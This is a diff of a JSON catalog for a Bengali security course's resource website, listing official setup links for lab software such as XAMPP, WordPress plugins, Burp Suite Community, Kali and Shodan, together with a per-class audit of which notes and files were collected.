       "text": "ক্লাস ২০ ও ২২-এর local lab software। XAMPP-এ Apache, MariaDB, PHP এবং phpMyAdmin থাকে।\nসেটআপ: XAMPP ইনস্টল → Apache/MySQL চালু → htdocs-এর নিজের lab folder-এ WordPress extract → localhost/phpmyadmin-এ database তৈরি → localhost-এ WordPress সেটআপ। Database port ও web server port আলাদা।\nক্লাস ২২: ৩৭:০০–৩৯:০০ XAMPP/htdocs; ৪১:০০–৫৯:০০ database নিয়ে কাজ। ভিডিওতে WordPress 7.1.2 দেখা যায়; নিচে অফিসিয়াল বর্তমান ZIP। XAMPP installer ও Control Panel-এর version আলাদা।",
       "links": [
@@ -3697,7 +3785,9 @@
         "entry-145"
       ],
       "resourceKinds": [
-        "tools"
+        "tools",
+        "documents",
+        "notes"
       ],
       "text": "ক্লাস ২০-এর Elementor topic-এর অফিসিয়াল free plugin। Plugins → Add New → Upload Plugin → ZIP দিন → Activate। Pages → Edit with Elementor দিয়ে নিজের lab page সম্পাদনা করুন। এটি Pro package নয়।",
       "links": [
@@ -3725,7 +3815,9 @@
         "entry-148"
       ],
       "resourceKinds": [
-        "tools"
+        "tools",
+        "documents",
+        "notes"
       ],
       "text": "ক্লাস ২২-এ Duplicator Pro দেখা যায়। পাওয়া Pro ZIP-এ activation-state পরিবর্তন থাকায় সেটি এখানে বিতরণ করা হয়নি। নিচে অফিসিয়াল free Lite বিকল্প; Lite ও Pro-এর সুবিধা এক নয়।\nসেটআপ: Plugins → Add New → Duplicator খুঁজে Install/Activate। নিজের lab site-এর backup তৈরি করুন। পুনরুদ্ধারের আগে বর্তমান site/database backup রাখুন।",
       "links": [
@@ -3752,12 +3844,15 @@
       "relatedRecordingIds": [
         "entry-90",
         "entry-115",
-        "entry-134"
+        "entry-134",
+        "entry-107"
       ],
       "resourceKinds": [
-        "tools"
+        "tools",
+        "documents",
+        "notes"
       ],
-      "text": "ক্লাস ৮-এর Proxy/Intruder, ক্লাস ১১-এর PortSwigger lab ও ক্লাস ১৮-এর Kali/Burp setup-এর জন্য অফিসিয়াল Community বিকল্প। Pro-এর সব সুবিধা এতে নেই।\nনিজের lab-এ Proxy-এর embedded browser দিয়ে শুরু করুন। আলাদা Firefox ব্যবহারে proxy/certificate setup প্রয়োজন। বর্তমান native installer-এ Java runtime থাকে; বর্তমান JAR-এর জন্য Java 21 বা পরের সংস্করণ প্রয়োজন। পুরোনো course version-এর compatibility আলাদা।",
+      "text": "ক্লাস ৮-এর Proxy/Intruder, ক্লাস ১১-এর PortSwigger lab ও ক্লাস ১৮-এর Kali/Burp setup-এর জন্য অফিসিয়াল Community বিকল্প। Pro-এর সব সুবিধা এতে নেই।\nনিজের lab-এ Proxy-এর embedded browser দিয়ে শুরু করুন। আলাদা Firefox ব্যবহারে proxy/certificate setup প্রয়োজন। বর্তমান native installer-এ Java runtime থাকে; বর্তমান JAR-এর জন্য Java 21 বা পরের সংস্করণ প্রয়োজন। পুরোনো course version-এর compatibility আলাদা।\nক্লাস ১০-এর সংরক্ষিত FileUV.pdf-এ Burp Suite-এর উল্লেখ আছে; সেই PDF-এর সহায়ক official setup এখানেও যুক্ত।",
       "links": [
         "https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install"
       ],
@@ -3794,7 +3889,9 @@
         "entry-134"
       ],
       "resourceKinds": [
-        "tools"
+        "tools",
+        "documents",
+        "notes"
       ],
       "text": "ক্লাস ১৪-এর virtual lab ও ক্লাস ১৮-এর Kali setup-এর অফিসিয়াল sources। নিজের architecture অনুযায়ী Kali installer/VM image নিন। VMware download-এ Broadcom account ও terms লাগতে পারে; এটি সরাসরি installer mirror নয়। ক্লাসের installation guide Tools ট্যাবেও আছে।",
       "links": [
@@ -3828,7 +3925,9 @@
         "entry-147"
       ],
       "resourceKinds": [
-        "tools"
+        "tools",
+        "documents",
+        "notes"
       ],
       "text": "ক্লাস ১৮-এর Java/Go নোট ও ক্লাস ২১-এর Recon resource-এর প্রস্তুতির software sources। Go ক্লাস ১৮-এরও বিষয়; Python/Git/curl/wget-এর প্রস্তুতি Recon resource-এ আছে।\nনিজের OS-এর অফিসিয়াল installer নিন। Go/Python/Git version ও Go PATH যাচাই করুন। Python packages-এর জন্য পৃথক environment রাখুন। সব Recon phase শেখানো সম্পূর্ণ হয়েছে এমন দাবি করা হচ্ছে না।",
       "links": [
@@ -3866,7 +3965,9 @@
         "entry-147"
       ],
       "resourceKinds": [
-        "tools"
+        "tools",
+        "documents",
+        "notes"
       ],
       "text": "ক্লাস ২১-এর Shodan topic-এর অফিসিয়াল web tool। আলাদা installer প্রয়োজন নেই। সেবার account/plan অনুযায়ী সুবিধা পাওয়া যায়।",
       "links": [
@@ -3936,6 +4037,36 @@
       "links": [],
       "downloadLinks": [],
       "verifiedAt": "2026-10-08"
+    },
+    {
+      "id": "tool-windows-batch",
+      "title": "Windows Command Prompt — Batch Scripting সহায়ক রেফারেন্স",
+      "topic": "Linux & Scripting",
+      "category": "tools",
+      "date": null,
+      "dateVerified": false,
+      "collectionIndex": 161,
+      "relatedRecordingId": "entry-117",
+      "relatedRecordingIds": [
+        "entry-117"
+      ],
+      "resourceKinds": [
+        "tools",
+        "documents",
+        "notes"
+      ],
+      "text": "সংরক্ষিত Batch Scripting Short Notes-এর .bat উদাহরণগুলোর জন্য Windows Command Prompt-এর Microsoft রেফারেন্স। Command Prompt Windows-এর অংশ; আলাদা installer লাগে না। নিজের অনুশীলনের folder-এ .bat ফাইল নিয়ে কাজ করুন।",
+      "links": [
+        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd"
+      ],
+      "downloadLinks": [
+        {
+          "label": "Microsoft Command Prompt reference ↗",
+          "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd",
+          "origin": "official"
+        }
+      ],
+      "verifiedAt": "2026-10-08"
     }
   ],
   "schedule": {
@@ -3952,7 +4083,7 @@
     "timeZoneNote": "মূল পোস্টে সময় অঞ্চল লেখা নেই; সময়গুলো পোস্টের ভাষা অনুযায়ী।",
     "source": "https://www.facebook.com/groups/awsb66delta/posts/1598190601883529"
   },
-  "siteVersion": "2026-10-08-class21-youtube-processing",
+  "siteVersion": "2026-10-08-all-classes-resource-audit",
   "resourcePlan": {
     "phase": "website-first",
     "structureReady": true,
@@ -4395,117 +4526,117 @@
   },
   "toolsAudit": {
     "verifiedAt": "2026-10-08",
-    "method": "২২টি ক্লাসের catalog ও সংরক্ষিত নোট/ফাইলের সংযোগ যাচাই; ক্লাস ২২-এর ভিডিওর নির্দিষ্ট দৃশ্য যাচাই। সব ভিডিও সম্পূর্ণ দেখা হয়েছে এমন দাবি নয়।",
+    "method": "২২টি ক্লাসের live পৃষ্ঠা ও প্রতিটির ক্লাসের তথ্য, নোট, ডকুমেন্ট এবং টুলস ট্যাব পৃথকভাবে যাচাই; মূল ভিডিওর player সংযোগ পরীক্ষা। সম্পূর্ণ ভিডিওগুলো নতুন করে দেখা হয়নি।",
     "classes": [
       {
         "recordingId": "entry-20",
         "serial": 1,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "কোর্স পরিচিতির নোট আছে; আলাদা software ফাইল পাওয়া যায়নি।"
       },
       {
         "recordingId": "entry-40",
         "serial": 2,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-46",
         "serial": 3,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-58",
         "serial": 4,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-64",
         "serial": 5,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "সংরক্ষিত manual SQLi homework নোট যুক্ত। এই ক্লাসের আলাদা tool package পাওয়া যায়নি।"
       },
       {
         "recordingId": "entry-80",
         "serial": 6,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "সংরক্ষিত XSS নোট ও HW5 PDF যুক্ত। আলাদা software package পাওয়া যায়নি।"
       },
       {
         "recordingId": "entry-88",
         "serial": 7,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "SQLi WAF নোট যুক্ত। আলাদা tool package পাওয়া যায়নি।"
       },
       {
         "recordingId": "entry-90",
         "serial": 8,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-99",
         "serial": 9,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-107",
         "serial": 10,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-115",
         "serial": 11,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-112",
         "serial": 12,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-117",
         "serial": 13,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-122",
         "serial": 14,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-124",
         "serial": 15,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "মূল ক্লাস ভিডিও আছে। এই ক্লাসের পৃথক notes/PDF/tool package এখনও সংগ্রহ করা হয়নি।"
       },
       {
         "recordingId": "entry-126",
         "serial": 16,
-        "note": "সম্পর্কিত PDF আছে; Crypter/RAT executable-এর যাচাই করা সংরক্ষিত download পাওয়া যায়নি।"
+        "note": "সংরক্ষিত PDF নোট আছে। Crypter/RAT executable-এর যাচাই করা download পাওয়া যায়নি।"
       },
       {
         "recordingId": "entry-132",
         "serial": 17,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "LFI/Web Server PDF নোট আছে; পৃথক lab tool package পাওয়া যায়নি।"
       },
       {
         "recordingId": "entry-134",
         "serial": 18,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-142",
         "serial": 19,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "মূল ভিডিওর দুই অংশ যুক্ত। এই ক্লাসের পৃথক notes/PDF/tool package এখনও সংগ্রহ করা হয়নি।"
       },
       {
         "recordingId": "entry-145",
         "serial": 20,
-        "note": "সংরক্ষিত নোট ও সংশ্লিষ্ট resources দেখুন। শুধু টপিক মিলে কোনো software-কে ক্লাসে ব্যবহৃত বলা হয়নি।"
+        "note": "এই ক্লাসের পাওয়া নোট, ডকুমেন্ট ও tool/setup resources সংশ্লিষ্ট ট্যাবে যুক্ত। পূর্ণ resource তালিকা নিচের সংযোগে দেখুন।"
       },
       {
         "recordingId": "entry-147",
         "serial": 21,
-        "note": "Shodan ও prerequisite sources যুক্ত। মূল ভিডিও YouTube-এ আপলোড হয়েছে; SD processing ও প্লেব্যাক যাচাই বাকি।"
+        "note": "Shodan ও Recon prerequisite guides যুক্ত। YouTube upload সম্পন্ন; Studio-তে SD processing ও Unlisted প্রকাশ এখনও pending।"
       },
       {
         "recordingId": "entry-148",
         "serial": 22,
-        "note": "Wordfence, migration plugin ও local lab setup যুক্ত। Practice website/database files-এর কপি এখনও পাওয়া যায়নি।"
+        "note": "Migration plugin, Wordfence ও local lab guides যুক্ত। Practice website/database files-এর কপি এখনও পাওয়া যায়নি।"
       }
     ]
   }
